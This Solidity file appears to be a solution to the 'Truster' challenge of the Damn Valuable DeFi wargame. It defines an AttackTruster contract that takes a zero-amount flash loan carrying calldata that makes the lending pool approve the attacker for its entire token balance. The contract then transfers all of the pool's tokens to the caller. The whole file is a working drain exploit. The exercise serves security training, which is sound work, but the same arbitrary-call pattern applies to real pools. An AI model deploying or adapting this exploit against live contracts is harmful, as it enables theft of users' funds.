// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";
import "../DamnValuableToken.sol";

contract AttackTruster {
    TrusterLenderPool immutable pool;
    DamnValuableToken immutable token;

    constructor(address _pool, address _token) {
        pool = TrusterLenderPool(_pool);
        token = DamnValuableToken(_token);
    }

    function attack() external returns (bool) {
        pool.flashLoan(
            0,
            address(this),
            address(token),
            abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this),
                token.balanceOf(address(pool))
            )
        );
        return (
            token.transferFrom(
                address(pool),
                msg.sender,
                token.balanceOf(address(pool))
            )
        );
    }
}
